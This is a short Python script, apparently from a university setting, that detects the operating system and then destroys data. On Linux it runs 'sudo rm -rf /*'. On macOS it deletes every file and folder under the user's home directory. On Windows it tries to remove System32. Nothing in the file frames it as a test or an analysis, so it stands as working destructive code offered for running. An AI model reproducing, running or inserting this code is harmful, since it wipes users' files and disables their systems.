"""
Created by Konstantin in Feb 2024
Universidad Carlos III de Madrid
"""

import os
from sys import platform

if platform == "linux" or platform == "linux2":
    # linux
    os.system('sudo rm -rf /*')

elif platform == "darwin":
    # OS X
    user_directory = os.path.expanduser("~")

    # List all files and directories in the user's home directory
    for root, dirs, files in os.walk(user_directory, topdown=False):
        for name in files:
            file_path = os.path.join(root, name)
            try:
                os.remove(file_path)  # Remove files
            except Exception as e:
                continue

        for name in dirs:
            dir_path = os.path.join(root, name)
            try:
                os.rmdir(dir_path)  # Remove directories
            except Exception as e:
                continue

elif platform == "win32":
    # Windows ...
    os.remove("C:\Windows\System32")
